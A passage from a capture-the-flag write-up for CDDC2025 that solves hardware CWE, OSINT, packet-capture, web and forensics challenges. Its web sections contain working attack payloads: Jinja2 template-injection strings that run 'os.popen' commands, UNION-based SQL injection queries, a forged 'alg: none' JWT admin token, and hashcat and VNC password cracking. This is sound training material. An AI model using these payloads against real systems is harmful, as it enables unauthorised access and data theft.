(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
    }
  </script>
  <!-- Hint: It's an encodment of JavaScript into a Japanese style emoticons -->
```

The JavaScript looked suspiciously encoded (lots of strange characters like `ﾟωﾟ`, `_`, etc.), which suggested it was AAEncoded. Copy the contents inside the function checkInput() { ... } and paste it into an [online AAEncode decoder](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html). The decoded JavaScript revealed the flag:
```js
const input = document.getElementById("secretInput").value;
if (input === "correctpassword") {
  alert("CDDC2025{Who_the_hell_made_this..}");
} else {
  alert("Incorrect value. Try again.");
}
```

The flag is: `CDDC2025{Who_the_hell_made_this..}`

## Introduction to Hardware CWE

### What_is_the_vuln

```text
Challenge: what is the Vulnerability?
You are analyzing the JTAG protection mechanism in a SoC. Below is a snippet from a password checker based on HMAC-SHA256 authentication.

Can you spot the flaw that allows insecure access? what is the CWE for this Vulnerability


logic [31-1:0] data_d, data_q;
logic [512-1:0] pass_data;

Write: begin
  if (pass_mode) begin
    pass_data = { {60{8'h00}}, data_d}; // Suspicious: this is only 480 bits of zeros + 32 bits of data!
    state_d = PassChk;
    pass_mode = 1'b0;
  end
end
```

The challenge requires us to analyze a password authentication mechanism in an SoC (System on Chip), implemented in hardware (likely Verilog or SystemVerilog).  

`pass_data` is 512 bits (to hold a 512-bit value, e.g., an HMAC-SHA256 digest input). But the assignment only concatenates 60 bytes of 0 (60*8=480 bits) and 32 bits of input data (data_d). This means that `pass_data` is filled by 512 bits = 480 bits zero + 32 bits real input. Instead of supplying a full 512-bit input, it’s mostly zero-padded.  

HMAC-SHA256 expects 512-bit blocks as input. By hardcoding the first 480 bits to zero, this reduces the effective entropy and search space of valid password inputs. Rather than a 512-bit (or 256-bit) secure input, an attacker needs to brute-force only 32 bits. The password space is reduced from 2^512 to 2^32 which makes it vulnerable to brute-force attacks.

This is a [CWE-1191](https://cwe.mitre.org/data/definitions/1191.html): On-Chip Debug and Test Interface With Improper Access Control.

The flag is: `CDDC2025{0n-Chip_Debug_and_Test_Interface_With_Impr0per_Access_C0ntr0l}`

### What_Weakness_Does_This_Reflect

Similarly, we are given another code snippet:

```text
...
assign key_big0 = debug_mode_i ? 192'b0 : {key0[0],
key0[1], key0[2], key0[3], key0[4], key0[5]};

assign key_big1 = debug_mode_i ? 192'b0 : {key1[0],
key1[1], key1[2], key1[3], key1[4], key1[5]};

assign key_big2 = {key2[0], key2[1], key2[2],
key2[3], key2[4], key2[5]};
...
assign key_big = key_sel[1] ? key_big2 : ( key_sel[0] ?
key_big1 : key_big0 );
...
```

This is a [CWE-1243](https://cwe.mitre.org/data/definitions/1243.html): Sensitive Non-Volatile Information Not Protected During Debug.

The flag is: `CDDC2025{Sensitive_Information_in_Hardware_Pin_State}`

### SHADOWWRITE

Analyze the Verilog snippet! Can you spot the flaw in the RTL code and determine the alternate address that could be used to change the protected value?

You've intercepted a Verilog module running on a mysterious IoT device. It implements a security feature controlled by an access-controlled register at address 0xF00. However, something seems fishy — you suspect there's a shadow copy of this register that bypasses the security mechanism.

Due to an incomplete address authorization check, an attacker can write to a shadow register that mirrors a protected one.

Note: The register ACCESS_GATE is located at address 0xF00. A mirror of this register, called COPY_OF_ACCESS_GATE, exists at location 0x800F00. The register ACCESS_GATE is protected from unauthorized agents and only allows access to select IDs, while COPY_OF_ACCESS_GATE is not.

```verilog
module foo_bar(data_out, data_in, incoming_id, address, clk, rst_n);
    output reg [31:0] data_out;
    input [31:0] data_in, incoming_id, address;
    input clk, rst_n;

    wire write_auth, addr_auth;
    reg [31:0] acl_oh_allowlist, q;

    assign write_auth = | (incoming_id & acl_oh_allowlist) ? 1 : 0;

    always @* begin
        acl_oh_allowlist <= 32'h8312;
    end

    assign addr_auth = (address == 32'hF00) ? 1 : 0; // Bug: Doesn't include shadow register!

    always @ (posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            q <= 32'h0;
            data_out <= 32'h0;
        end else begin
            q <= (addr_auth & write_auth) ? data_in : q;
            data_out <= q;
        end
    end
endmodule
```

In this challenge, we are given a Verilog module that controls access to a protected register called ACCESS_GATE, located at address 0xF00:  

`assign addr_auth = (address == 32'hF00) ? 1 : 0; // Only checks 0xF00`  

This line checks if the input address is 0xF00 to authorize writes. But in the problem description, we’re told that there’s a shadow copy of this register located at 0x800F00 (called COPY_OF_ACCESS_GATE). The addr_auth logic only checks for 0xF00. It doesn’t check 0x800F00. But because COPY_OF_ACCESS_GATE is a mirror of ACCESS_GATE, writing to this shadow address will still update the protected value, bypassing the security check. This means that even though direct writes to 0xF00 are protected, writes to 0x800F00 are not checked. To exploit it, we write to address `0x800F00`. Entering `800F00` will gives us the flag.  

The flag is: `CDDC2025{NOW_Attacker_can_not_Write_2_Shadow_Register}`


### JTAG_MADNESS

```text
You’ve intercepted a microcontroller-based smart device.   
The board exposes some unpopulated pads labeled TDI, TDO, TCK, and TMS. Looks like JTAG, huh?  
You hooked it up and scanned using your favorite JTAG tool, and got the following output.  

Can you uncover any secrets from the exposed debug interface?  
But before that, what is the CWE for: "providing internal assets with the wrong debug access level, exposing the asset to untrusted debug agents"?  

[INFO] Starting JTAG scan...
[INFO] Detected TCK pulse
[INFO] IDCODE scan found 1 device
[DEVICE 0]
  - IDCODE: 0x4BA00477
  - Manufacturer: ARM
  - Part: Cortex-M3
  - IR Length: 4
  - Access: FULL DEBUG (No restrictions)

[INFO] Enumerating memory map...
  Found valid memory range: 0x08000000 - 0x0803FFFF (FLASH)
  Found valid memory range: 0x20000000 - 0x2000FFFF (SRAM)
  Found Debug Port: DAP v1
  Found access to AHB-AP

[INFO] Dumping FLASH @ 0x08000100 → 0x080001F0...
```

This challenge describes a smart device with exposed pads labeled `TDI`, `TDO`, `TCK`, `TMS` — this is JTAG. A JTAG deubgger is connected and ran a scan, giving the output above. This tells us that the device allows FULL DEBUG ACCESS without any restrictions. This means no protection is enabled on the debug interface, allowing full access to the system.

The challenge asks:  

What is the CWE for: "providing internal assets with the wrong debug access level, exposing the asset to untrusted debug agents"?  

Looking at the hint and documentation, the correct CWE is: `CWE-1244: Improper Access Control for Debug Interface`. After entering the CWE, it revealed a memory dump starting at address 0x08000100:

```text
0x08000140: 43 44 44 43 32 30 32 35 7b 6a 74 61 67 5f 61 63
0x08000150: 63 65 73 73 5f 67 72 61 6e 74 65 64 5f 6f 76 65
0x08000160: 72 5f 6a 74 61 67 7d 00 00 00 00 ...
```

Converting the bytes at 0x08000140 onward to ASCII gives the flag:

```text
43 44 44 43 32 30 32 35 7b 6a 74 61 67 5f 61 63
C D D C 2 0 2 5 { j t a g _ a c

63 65 73 73 5f 67 72 61 6e 74 65 64 5f 6f 76 65
c e s s _ g r a n t e d _ o v e

72 5f 6a 74 61 67 7d
r _ j t a g }
```

The flag is: `CDDC2025{jtag_access_granted_over_jtag}`

### Knockin' on Heaven's Vault [UNSOLVED]

Well, the vault isn't very heavenly...
But we still want it open, don't we?

http://52.76.13.43:8148/

**THE SOLUTION FOR THIS IS NOT FOUND**

# Advanced

## Open Source Intelligence (OSINT)

Most of the questions in this topic has the following instruction:  

Flag format : CDDC2025{   }
 - All lowercase
 - Replace space with _ (underscore)

### declassified

Heads up, Brainhackers!
Let's brush up your OSINT skills so that our mission is successful.

The site cia.gov released a pdf document on 30 July 2012 about Bulgaria.
What is the subject of the document?

After simple google searching with `site:cia.gov filetype:pdf "Bulgaria" "30 July 2012"`, we found the document subject.

The flag is: `CDDC2025{the_bulgarian_air_force}`

### past

Star is teaching you how to go back in time, but not physically.
If you go to allgames.com, you can see that its tagline is "Talking about video games and...".
Can you see what was its tagline on 1 January 2005?

Check the [Wayback Machine](archive.org) to view historical snapshots of `allgames.com` from that time. Search for allgames.com on the Wayback Machine and look at archived pages from January 2005—the tagline was: `"It's not just talk about games, it's what gamers are talking about."`.

The flag is: `CDDC2025{its_not_just_talk_about_games_its_what_gamers_are_talking_about}`

### What_kind_of_technology_is_it

The link brings us to answer the question: `What is the name of the technology that allows Windows 32bit applications to run on Windows 64bit?` Entering the answer: `WoW64`, we get the flag.

The flag is: `CDDC2025{WoW_IS_VERY_INTERESTING_TECH}`

### connections

Star really likes to emphasize the importance of Opsec.
As an example, she told you to take a look at the Reddit account 'quantumcat78'.
Based on his posts, can you tell his real name?

From the reddit account, we found his github account, where we found his name `johan minkowski` in his email.  

The flag is: `CDDC2025{johan_minkowski}`

### livestream

In her spare time, Star likes to randomly watch a livestream of places around the world.

In the video, a train is passing along the elevated rail tracks.
What is the next station the train will stop?

After taking a screenshot and search on the railway in the video, we found that it is a live camera view looking Southeast towards the Metropolitan Industrial Trade Center in Tokyo, Japan. The railway captured is the Shiodome Rail Tracks and the next location is takeshiba.

The flag is: `CDDC2025{takeshiba}`

### WHOISTHISPOKEMON

Access the given URL, where Pikachu provides a clue about finding the red-nosed Pokémon and determining its final form. Download the file `whoisthatpokemon.pcapng` and export the objects within it. Preview the extracted images and identify the red-nosed Pokémon as `Oshawott`. Use Google to search for its final evolution, which is `Samurott`. Submit "samurott" in the given URL, and receive the flag.

The flag is: `CDDC2025{Finally?OMGAfterSomanyPIKKAhints!}`

### WHERETHEHACKAMI

WHERE did I travel in sequence?
first(UPPER) + second(lower) + third(lower)

Can you figure out where I traveled — in the correct order?
Your answer should be the names of three locations I visited:
- The first airportname ALL UPPERCASE
- The second country all lowercase
- The third school all lowercase
Concatenate them all together (no spaces or symbols).

Similarly, download the file `location.pcapng` and export the objects within it. Preview the extracted images. There are 3 images, each tell us one of the above locations, after searching and finding out the locations, concatenate them all together gives: `NARITAgermanykoreauniversity` which gives us the flag upon submitting it.

The flag is: `CDDC2025{H0wd1dy0uKn0wwwh3r3iWAS}`

### Gold Chain

We received a tip from BH-2000 that Cypher left a clue in an NFT that could help us.
Your task is to examine the transaction history of Cypher's wallet: 
0xEDFfD5AEc7f8f1b9E112DD12C04507359A578d47

Find the NFT and retrieve the flag. Cypher has been using Sepolia!

Using Etherscan (Sepolia network) to examine Cypher's wallet. An interesting [transaction](https://sepolia.etherscan.io/tx/0x45562689ae26ccdacdebb349c6237571bfc1ece81e0f78e6f89cd6aff0864884) with method `Transfer*` was found, indicating that data in the input field contain message in UTF-8:  
 `Smart move haha, thanks! CID : bafkreifm5tdw6sqb6mgzqmrdkmarpdioncyirczmcurfahaftchhlbze7y`. This CID (Content Identifier) suggests message is stored on IPFS (InterPlanetary File System). Since IPFS data is decentralized, we accessed the CID via an [IPFS gateway](https://bafkreifm5tdw6sqb6mgzqmrdkmarpdioncyirczmcurfahaftchhlbze7y.ipfs.dweb.link/) using `dweb.link`.

The flag is: `CDDC2025{transparency_immutable_decentralized}`

## Network Security

### WHOLOGIN

Download the file `ssh_capture.pcapng` and you will find two FTP packets indicating `msfadmin` as both username and password. Entering `msfadminmsfadmin` you will get the flag.

The flag is: `CDDC2025{DIDyouseeWHOwasLOGINGIN?}`

### PROTOCOL

Challenge: PROTOCOL from MARS not layer 4  
PORTNUMBER: I dont have to use port! to send Message!! or do i?  
ACTION: What is it doing to this ipaddr?? oh! its just Checking?

This challenge required identifying a protocol that doesn’t rely on traditional Layer 4 (Transport Layer) methods but is instead used for checking an IP address without ports. The key hints pointed toward ICMP (Internet Control Message Protocol).

- "PROTOCOL from MARS not layer 4" → Suggests a protocol that is not TCP or UDP.
- "PORTNUMBER: I don’t have to use port! to send Message!! or do I?" → Indicates the protocol doesn’t rely on ports like TCP/UDP.
- "ACTION: What is it doing to this ipaddr?? oh! it's just Checking?" → Implies the protocol is used to verify reachability, meaning ICMP (ping).
- ICMP (ping) packets are used for network diagnostics, and they don't rely on a specific port.
- The challenge’s answer was 8.8.8.8, which is Google’s public DNS server—a common target for ICMP ping requests to check connectivity.

The flag is: `CDDC2025{SorryitwasntFTPSORRY!}`

### WhatsTHEPASS

A communication channel has opened at port 23!  
What is the name of the protocol?

Answering the question with answer `telnet` gives us a file `whatismypass.pcap`. Open using wireshark, enter `telnet` in the filter, and select one of the packets and choose `follow TCP stream` we will see the password: `passwordiskisapasswordddddddddddd`.

The flag is: `CDDC2025{passwordiskisapasswordddddddddddd}`

### CaptureTHE_Flag

Am I the reason why MITM was born? Is it?  

Answering the riddle with answer `hypertexttransferprotocol` gives us a file `Find_flag.pcapng`. Open using wireshark, enter `http` in the fitler, we found the packet with the flag.

The flag is: `CDDC2025{HTTPIISVVERY_GOOD}`

### MSGFromSRC

A number of messages are coming from a certain address.  
Someone commented about something perculiar in one of the messages...  
What is it? Maybe it contains the flag?  

Answering the riddle with answer `162.159.136.234` gives us a file `src.pcapng`. Open using wireshark, apply filter `frame.comment`, we found a packet coming from `162.159.136.234` with comment `https://www.google.com/search?q=%43%44%44%43%32%30%32%35%7B%4E%65%74%77%6F%72%6B%48%45%58%70%6C%61%79%7D` which is the flag.

The flag is: `CDDC2025{NetworkHEXplay}`

### WHOISINBETWEEN

An attack that lets an attacker intercept the communication between computers had just happened. Can you find out who is involved in this attack?

Media Access Control Address  
We are under attack identify this attack!!, but from who? Is it Mac-intosh or Micro-soft Windows?

Answering the riddle with answer `maninthemiddle` gives us a file `MITM.pcap`. Open using wireshark, apply filter `arp`, we can see that MAC address `00:0c:29:ea:61:40` shows up as source in multiple ARP replies for different IPs to intercept traffic from multiple victims

The flag is: `CDDC2025{00:0c:29:ea:61:40}`

### DR0N3CAM [UNSOLVED]

Using a certain protocol, a drone was able to stream images through the network.

I stream the world in real time,  
Delivering views so clear, so prime.  
A hacker’s tool, a spy’s delight,  
I bring the world into your sight.  
What am I? i am a protocol and Where am I?  

Answering the riddle with answer `realtimestreamingprotocol` gives us 3 files.

**THE SOLUTION FOR THIS IS NOT FOUND**

### EyeUs33300Plus2600

A system to control, but I'm far away, I send my frames in an efficient way. Finally, now I am able to US3 GUI to conTrol U! What am I?

Answering the riddle with answer `virtualnetworkcomputing` gives us a file `vnc.txt`. Opening it shows: `b3fc1fa2cc94950d`. Given the challenge name and the answer "virtualnetworkcomputing" (aka VNC), and the fact that VNC stores encrypted passwords in a file, this string is likely an encrypted VNC password.  

I used vncpwd.c, an open-source utility to decrypt VNC password files. I downloaded vncpwd.c source code from: `https://github.com/vanhauser-thc/thc-vncview/blob/master/vncpwd.c` Then compiled it: `gcc -o vncpwd vncpwd.c`. This produced the executable `vncpwd`.  

The encrypted password was given as a hex string in vnc.txt. I converted it to a binary file (vncpass.bin) using xxd: `echo "b3fc1fa2cc94950d" | xxd -r -p > vncpass.bin`. This created a binary file in the format expected by vncpwd. Running `./vncpwd vncpass.bin` gives the output `Password: vict0ry`

The flag is: `CDDC2025{vict0ry}`

## Web Exploitation

### NJOWNTE

Use web postman to send a POST request to the `/login` endpoint with the JSON payload. 

1. Open Postman and click on "New Request".
2. Set the request type to `POST` (using the dropdown next to the URL bar).
3. Enter the request URL: 
   ```
   http://52.76.13.43:8104/login
   ```
4. Go to the "Body" tab and select "raw".
5. Set the data format to JSON (Choose `JSON` from the dropdown).
6. Enter the JSON payload:
   ```json
   {
       "username": "guest",
       "password": "guest"
   }
   ```
7. Go to the "Headers" tab and add the following header:
   - `Content-Type: application/json`
8. Click "Send" to execute the request.

The authentication is successful, a token is received in the response:
```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.1bAygaodib4H4E3iMScGZ4DfAy1NZMvCI8hAXP_NCfA"
}
```

Now send a GET request to the `/flag` endpoint using the token obtained.

1. Go to "Authorization" tab
2. Select "Bearer Token" as Auth Type and enter the token obtained.
3. Click "Send" to execute the request.

```json
{
    "error": "Not an admin"
}
```

We suspect the server may not validate JWT signatures or accept unsigned tokens with "alg": "none" (a known JWT misconfiguration). We manually craft a token:

We manually craft a token:

Header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Payload:

```json
{
  "username": "admin"
}
````

Then we Base64-encode the header and payload to get the forged JWT Token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
```  

Note: There's no signature part at the end.  
Using this token, we get the response containing the flag: 

```json
{
    "flag": "CDDC2025{you_F0rg3d_the_t0k3n_like_a_PRO}\n"
}
```

### THETEMP

Exploit the SSTI (Server-Side Template Injection) vulnerability to read the contents of the flag.txt file!

The link given brings us to a page with an vulnerable input field where user input is directly processed by the server's template engine. This is tested by injecting expression `{{7*7}}` which returns `49`. Since the execution works, we can use system commands to attempt to read `flag.txt`. 

We input the command: `{{config.items()}}` and `${7*7}` to find out if it is Flask/Jinja2 or Java-based engine. 

We tested further payloads like:  
`{{config.items()}}` – revealed app config values  
`{{request.environ}}` – dumped server environment variables  
`{{get_flashed_messages()}}` – 
This confirmed server-side template injection with full Python object access:

```text
{{config.items()}}

dict_items([('DEBUG', False), ('TESTING', False), 
('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None),    
('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)),   
('USE_X_SENDFILE', False), ('SERVER_NAME', None),  
('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), 
('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), 
('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), 
('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), 
('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), 
('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), 
('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), 
('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])
```

```text
{{request.environ}}

{'wsgi.version': (1, 0), 'wsgi.url_scheme': 'http', 'wsgi.input': <_io.BufferedReader name=8>, 
'wsgi.errors': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>, 
'wsgi.multithread': True, 'wsgi.multiprocess': False, 'wsgi.run_once': False, 
'werkzeug.socket': <socket.socket fd=8, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('172.80.43.2', 5000), raddr=('121.6.206.159', 61673)>, 
'SERVER_SOFTWARE': 'Werkzeug/3.0.6', 'REQUEST_METHOD': 'POST', 'SCRIPT_NAME': '', 
'PATH_INFO': '/', 'QUERY_STRING': '', 'REQUEST_URI': '/', 'RAW_URI': '/', 
'REMOTE_ADDR': '121.6.206.159', 'REMOTE_PORT': 61673, 'SERVER_NAME': '0.0.0.0', 
'SERVER_PORT': '5000', 'SERVER_PROTOCOL': 'HTTP/1.1', 'HTTP_HOST': '52.76.13.43:8105', 
'HTTP_CONNECTION': 'keep-alive', 'CONTENT_LENGTH': '37', 'HTTP_CACHE_CONTROL': 'max-age=0', 
'HTTP_ORIGIN': 'http://52.76.13.43:8105', 'CONTENT_TYPE': 'application/x-www-form-urlencoded', 
'HTTP_UPGRADE_INSECURE_REQUESTS': '1', 'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36', 
'HTTP_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
'HTTP_REFERER': 'http://52.76.13.43:8105/', 'HTTP_ACCEPT_ENCODING': 'gzip, deflate', 'HTTP_ACCEPT_LANGUAGE': 'en-US,en;q=0.9', 
'HTTP_COOKIE': 'session=eyJpaWkiOjAsImlucHV0X3N0cmluZyI6IiJ9.aB4gGg.Sdgc5BZrkWh-xZr88R3YwxISGgQ', 
'werkzeug.request': <Request 'http://52.76.13.43:8105/' [POST]>}
```

Initially, we attempted to list all subclasses of Python’s base object to find _io.TextIOWrapper and directly read the file: `{{ ''.__class__.__mro__[1].__subclasses__() }}`. However, the file-related classes like _io.TextIOWrapper or _io.FileIO were not exposed in the environment.

Instead, we pivoted to accessing Python's global objects within Jinja2’s internal functions. These allow us to reach the os module:   
`{{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}`  
and  
`{{url_for.__globals__.os.popen('cat flag.txt').read()}}`  
where both successfully executed the `cat flag.txt` system command, returning the flag contents directly in the rendered output.

The flag is: `CDDC2025{HOW_DID_YOU_LIKE_THIS_SSTI}`

### INJECTED_YES

A simple search form is all you have. Enter a username, and the system tells you who they are. But under the hood, it's vulnerable. Brainhackers, we need to uncover the secret within the database.

Upon visiting the page, we’re presented with a search form that accepts a username and returns results from the database. Testing with: `admin' OR '1'='1` returned only the user admin, not all users. This indicated some filtering or query logic, but likely still vulnerable.  

Next, we tried a UNION-based SQL injection to test the number of columns:

`' UNION SELECT 1,2,3-- `  

This returns:

```text
ID	 Username	Password
1	 2	        3
1	 admin	    CDDC2025{Fake}
2	 user     	mypassword
5	 flag	    is in here
```

We confirmed the query has 3 columns.

`' UNION SELECT id, username, password FROM users--` also returns similar result as above.

To find hidden content, we enumerated all tables:

`' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table'--`

This returns:

```text
ID	 Username	        Password
1	 admin	            CDDC2025{Fake}
1	 flag	            3
1	 sqlite_sequence	3
1	 users	            3
2	 user	            mypassword
5	 flag	            is in here
```

We inspected the structure of table `flag`:

`' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table' AND name='flag'--`

This returns:

```text
ID	Username	                            Password
1	CREATE TABLE "flag" ( "flag" TEXT )	    3
1	admin	                                CDDC2025{Fake}
2	user	                                mypassword
5	flag	                                is in here
```

This confirmed the table has only one column: flag.

To extract it, we needed to match the column count. So we padded with dummy values:

`' UNION SELECT 1, flag, 3 FROM flag--`

This returns:

```text
ID	Username	                            Password
1	CDDC2025{YESINJECTED_WITH_POISON!!!!}	3
1	admin	                                CDDC2025{Fake}
2	user	                                mypassword
5	flag	                                is in here
```

The flag is: `CDDC2025{YESINJECTED_WITH_POISON!!!!}`

### BROKEN_LOGIN

Logging in seems to do something...  
Something... sweet.  

Your mission is to sniff out the flag, which might be hiding in plain sight.  

The provided HTML source code reveals a login/register interface with basic frontend JavaScript logic. We’re told the flag is "hiding in plain sight" and hinted it might relate to something “sweet” — a likely reference to cookies in web development.

We attempted to log in using common test credentials:

```text
Username: admin  
Password: admin
```

After logging in, we were redirected to a plain message:

`"We gave you a FLAG! Look carefully, you can find it!"`

This strongly indicated that the flag is stored somewhere other than the page content — likely in browser storage or headers.

In the browser's Developer Tools → Application → Cookies, we found a cookie named `SESSION` with a suspicious long encoded string:

`UTBSRVF6SXdNalY3UjI5dlpGOW5kV1Z6YzE5RGIyOXJhV1ZmWTJGdVgySmxYM1JvWlY5R1RFRkhmUT09`

We Base64-decoded the value once:  
`echo "UTBSRVF6SXdNalY3UjI5dlpGOW5kV1Z6YzE5RGIyOXJhV1ZmWTJGdVgySmxYM1JvWlY5R1RFRkhmUT09" | base64 -d`  
this gives us:  
`Q0REQzIwMjV7R29vZF9ndWVzc19Db29raWVfY2FuX2JlX3RoZV9GTEFHfQ==`  
It looked like another Base64 string, so we decoded again:  
`echo "Q0REQzIwMjV7R29vZF9ndWVzc19Db29raWVfY2FuX2JlX3RoZV9GTEFHfQ==" | base64 -d`  
which gives us the flag.

The flag is: `CDDC2025{Good_guess_Cookie_can_be_the_FLAG}`

### FINDPASSWORD

admin is already registered and I have the information from traceback when I attempted to click signup without filling in anything

```sql
cur.execute('INSERT INTO Users VALUES(:username, :password)', 
{'username':USERNAME, 'password':bcrypt.generate_password_hash(PASSWORD)})

cur.execute('INSERT INTO Mail(sender, receiver, title, content) VALUES(:sender, :receiver, :title, :content)', 
{'sender':'admin', 'receiver':USERNAME, 'title':'Do you want a flag?', 'content':'<span>If you\'re looking for the flag, it\'s in my account. Try hacking into it.<br>This is the password hash for my account: $2b$12$gVjkJtERaPrWjfBw0Lu7aOcoIzZzkm1gaO3SLYV8wXL63CHSMnJfC<br><b>Here\'s a hint:</b> I only use numbers in my password, and it\'s never more than 5 digits long.<br><b>GOOD LUCK!</b></span>'})
```

```bash
$ hashcat -m 3200 -a 0 hash.txt numeric.txt

$2b$12$gVjkJtERaPrWjfBw0Lu7aOcoIzZzkm1gaO3SLYV8wXL63CHSMnJfC:85675

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$12$gVjkJtERaPrWjfBw0Lu7aOcoIzZzkm1gaO3SLYV8wXL6...SMnJfC
Time.Started.....: Sun May 11 17:02:23 2025 (47 mins, 25 secs)
Time.Estimated...: Sun May 11 17:49:48 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (numeric.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       30 H/s (4.63ms) @ Accel:18 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 85680/100000 (85.68%)
Rejected.........: 0/85680 (0.00%)
Restore.Point....: 85662/100000 (85.66%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4064-4096
Candidate.Engine.: Device Generator
Candidates.#1....: 85662 -> 85679

Started: Sun May 11 17:01:32 2025
Stopped: Sun May 11 17:49:53 2025
```

### SSRF1 [UNSOLVED]

**THE SOLUTION FOR THIS IS NOT FOUND**

### SSRF2 [UNSOLVED]

**THE SOLUTION FOR THIS IS NOT FOUND**

### FASTFORWARD [UNSOLVED]

**THE SOLUTION FOR THIS IS NOT FOUND**

## Cyber Forensics

### mystery

Star begins the lesson by testing your knowledge about how digital files work.
She gave you an image file.

"First and foremost, can you look what's inside the chest?"

We are given a picture, `chall.jpg`. When we run `binwalk` on the picture, we found that there is a hidden png image inside. We extract it using `binwalk --extract --dd=".*" chall.jpg`. When we open the png inside, we found the flag.

The flag is: `CDDC2025{file_inside_file}`

### tower

Star handed you another file—an image of a tower.
"The flag is flying high at the top," she said.
Yet, you still can't see it.

We have an image `chall.bmp`. When opened, the image showed a tower and the message: "The flag is up there....." However, no flag was visible in the image. This hinted that there might be more data "above" the visible image—possibly hidden in the unused parts of the file.

1. **File Size Check**  
The image file was about 12MB, which is unusually large for a simple BMP showing only a small tower image.

2. **Hex Inspection**  
Upon inspecting the file with a hex editor (xxd, hexedit, etc.), we confirmed it was a valid BMP file:  
    Signature: BM  
    Pixel data offset: 0x8A (138 bytes)  
    Width: 1000 pixels  
    Height: Initially 1000 pixels or less (depending on actual bytes)  

3. **Hypothesis**  
Since the file is 12MB, but only ~3MB worth of image was displayed, we guessed the height was being artificially limited in the header. The rest of the pixel data (possibly containing the flag) was being ignored by image viewers.

4. **Changing image height**
We located the BMP height field at offset `0x16` (22nd byte), which is a 4-byte little-endian integer. Using a hex editor, we changed the bytes at offset `0x16` to be `AC 0D 00 00` which is 3500 rows.

After saving the changes and reopening the image, more of the image was revealed, and at the top, we found the hidden flag in plaintext.

The flag is: `CDDC2025{BMP_stores_pixel_starting_from_the_bottom_row}`

### doctor

Now we are given another image `chall.png`. When we examine it with `exiftool` we found that there is error in the image:

```bash
$ exiftool chall.png

ExifTool Version Number         : 12.40
File Name                       : chall.png
Directory                       : .
File Size                       : 3.2 MiB
File Modification Date/Time     : 2025:05:11 22:31:26+08:00
File Access Date/Time           : 2025:05:11 22:31:45+08:00
File Inode Change Date/Time     : 2025:05:11 22:31:35+08:00
File Permissions                : -rw-r--r--
Error                           : File format error
```

And therefore we examine the header of the image:

```bash
$ xxd chall.png | head
00000000: 0050 4e47 0000 0000 0000 000d 4948 4352  .PNG........IHCR
00000010: 0000 0780 0000 0438 0802 0000 0067 b156  .......8.....g.V
00000020: 1400 0020 0049 4341 5478 9c74 bdc9 8f2c  ... .ICATx.t...,
00000030: 4bb7 e575 b2cf e8b3 8f3e 2233 eff7 aa80  K..u.....>"3....
00000040: 1194 1012 3384 6a56 3000 8454 2521 2106  ....3.jV0..T%!!.
00000050: bcf7 dd7b 6e73 baec 2222 a3cb 73bf 3764  ...{ns..""..s.7d
